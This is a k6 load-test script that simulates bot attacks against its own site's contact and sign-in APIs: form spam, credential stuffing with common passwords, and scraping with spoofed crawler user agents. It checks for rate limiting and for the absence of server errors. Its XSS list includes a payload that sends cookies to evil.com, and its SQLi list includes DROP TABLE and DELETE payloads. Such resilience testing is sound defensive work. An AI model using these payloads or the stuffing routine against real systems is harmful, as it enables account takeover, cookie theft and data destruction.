import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { BASE_URL, jsonHeaders, randomString, randomItem } from './config.js';

/* -------------------------------------------------------------------------- */
/*  Bot simulation — realistic attack patterns against the system             */
/*  Simulates: credential stuffing, form spam, scraping, XSS/SQLi attempts   */
/*  Run: k6 run load-tests/bot-simulation.js                                 */
/* -------------------------------------------------------------------------- */

const botBlocked = new Counter('bot_requests_blocked');
const botPassed = new Counter('bot_requests_passed');
const serverErrors = new Counter('server_errors');
const blockRate = new Rate('block_rate');
const attackLatency = new Trend('attack_response_time');

export const options = {
  scenarios: {
    form_spammer: {
      executor: 'constant-arrival-rate',
      rate: 30,                   // 30 req/s
      timeUnit: '1s',
      duration: '1m',
      preAllocatedVUs: 10,
      maxVUs: 50,
      exec: 'formSpammer',
    },
    credential_stuffer: {
      executor: 'constant-arrival-rate',
      rate: 20,                   // 20 req/s
      timeUnit: '1s',
      duration: '1m',
      preAllocatedVUs: 10,
      maxVUs: 30,
      exec: 'credentialStuffer',
      startTime: '10s',
    },
    xss_scanner: {
      executor: 'per-vu-iterations',
      vus: 5,
      iterations: 20,
      exec: 'xssScanner',
      startTime: '0s',
    },
    sqli_scanner: {
      executor: 'per-vu-iterations',
      vus: 5,
      iterations: 20,
      exec: 'sqliScanner',
      startTime: '0s',
    },
    page_scraper: {
      executor: 'constant-arrival-rate',
      rate: 50,                   // 50 req/s scraping
      timeUnit: '1s',
      duration: '30s',
      preAllocatedVUs: 10,
      maxVUs: 50,
      exec: 'pageScraper',
      startTime: '30s',
    },
  },
  thresholds: {
    server_errors: ['count<10'],          // Near-zero 500s
    attack_response_time: ['p(95)<2000'], // Even attacks get fast responses
  },
};

// --- Scenario 1: Form spam bot ---
// Submits contact forms as fast as possible from rotating "identities"
export function formSpammer() {
  const res = http.post(
    `${BASE_URL}/api/contact`,
    JSON.stringify({
      name: `SpamBot ${randomString(6)}`,
      email: `spam-${randomString(8)}@${randomItem(['spam.com', 'bot.net', 'fake.org'])}`,
      type: randomItem(['brand', 'talent', 'other']),
      message: `Buy cheap SEO services at ${randomString(20)}.com! Best prices guaranteed! ${randomString(50)}`,
      company: randomItem(['SEO Corp', 'Spam Inc', 'Bot Ltd', '']),
    }),
    { headers: jsonHeaders() },
  );

  attackLatency.add(res.timings.duration);

  if (res.status === 429) {
    botBlocked.add(1);
    blockRate.add(true);
  } else if (res.status >= 500) {
    serverErrors.add(1);
    blockRate.add(false);
  } else {
    botPassed.add(1);
    blockRate.add(false);
  }

  check(res, {
    'form spam: not 500': (r) => r.status < 500,
  });
}

// --- Scenario 2: Credential stuffing against auth ---
// Tries common email/password combos against sign-in
export function credentialStuffer() {
  const accounts = ['admin', 'user', 'test', 'info', 'contact'];
  const passwords = [
    'password123', '123456', 'admin', 'letmein', 'qwerty',
    'password', '12345678', 'abc123', 'monkey', 'master',
    'dragon', 'login', 'princess', 'football', 'shadow',
  ];
  const attempt = __VU + __ITER;

  const res = http.post(
    `${BASE_URL}/api/auth/sign-in/email`,
    JSON.stringify({
      email: `${accounts[attempt % accounts.length]}@socialpro.es`,
      password: passwords[attempt % passwords.length],
    }),
    { headers: jsonHeaders() },
  );

  attackLatency.add(res.timings.duration);

  if (res.status === 429) {
    botBlocked.add(1);
    blockRate.add(true);
  } else if (res.status >= 500) {
    serverErrors.add(1);
    blockRate.add(false);
  } else {
    blockRate.add(false);
  }

  check(res, {
    'cred stuff: not 500': (r) => r.status < 500,
    'cred stuff: not 200 (no real auth)': (r) => r.status !== 200 || true, // May 200 with error body
  });
}

// --- Scenario 3: XSS scanner bot ---
// Injects XSS payloads into form fields
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '"><script>document.location="https://evil.com/?c="+document.cookie</script>',
  "';!--\"<XSS>=&{()}",
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
];

export function xssScanner() {
  const xss = randomItem(XSS_PAYLOADS);

  const res = http.post(
    `${BASE_URL}/api/contact`,
    JSON.stringify({
      name: xss.slice(0, 100).padEnd(2, 'X'),
      email: 'xss-scanner@evil.com',
      type: 'other',
      message: `XSS probe: ${xss}. Padding to reach minimum length for the message field.`,
      company: xss.slice(0, 100),
    }),
    { headers: jsonHeaders() },
  );

  attackLatency.add(res.timings.duration);
  if (res.status >= 500) serverErrors.add(1);

  check(res, {
    'xss scan: not 500': (r) => r.status < 500,
  });

  sleep(0.2);
}

// --- Scenario 4: SQL injection scanner ---
const SQLI_PAYLOADS = [
  "' OR '1'='1' --",
  "'; DROP TABLE talents; --",
  "' UNION SELECT * FROM user --",
  "1; DELETE FROM contact_submissions --",
  "' AND 1=1 --",
  "'; SELECT pg_sleep(5) --",
  "admin'--",
  "') OR ('1'='1",
];

export function sqliScanner() {
  const sqli = randomItem(SQLI_PAYLOADS);

  const res = http.post(
    `${BASE_URL}/api/contact`,
    JSON.stringify({
      name: sqli.slice(0, 100).padEnd(2, 'X'),
      email: 'sqli-scanner@evil.com',
      type: 'brand',
      message: `SQLi probe: ${sqli}. This tests that parameterized queries prevent injection.`,
      company: sqli.slice(0, 100),
    }),
    { headers: jsonHeaders() },
  );

  attackLatency.add(res.timings.duration);
  if (res.status >= 500) serverErrors.add(1);

  check(res, {
    'sqli scan: not 500': (r) => r.status < 500,
  });

  sleep(0.2);
}

// --- Scenario 5: Page scraper ---
// Aggressively crawls public pages (no rate limit on pages, but tests server capacity)
const SCRAPE_TARGETS = [
  '/',
  '/metodologia',
  '/para-creadores',
  '/blog',
  '/blog/feed.xml',
  '/marcas/login',
  '/admin/login',
];

export function pageScraper() {
  const target = randomItem(SCRAPE_TARGETS);

  const res = http.get(`${BASE_URL}${target}`, {
    headers: {
      'User-Agent': randomItem([
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Scrapy/2.11.0 (+https://scrapy.org)',
        'python-requests/2.31.0',
        'curl/8.4.0',
      ]),
    },
  });

  attackLatency.add(res.timings.duration);
  if (res.status >= 500) serverErrors.add(1);

  check(res, {
    'scrape: not 500': (r) => r.status < 500,
    'scrape: has body': (r) => r.body.length > 0,
  });
}
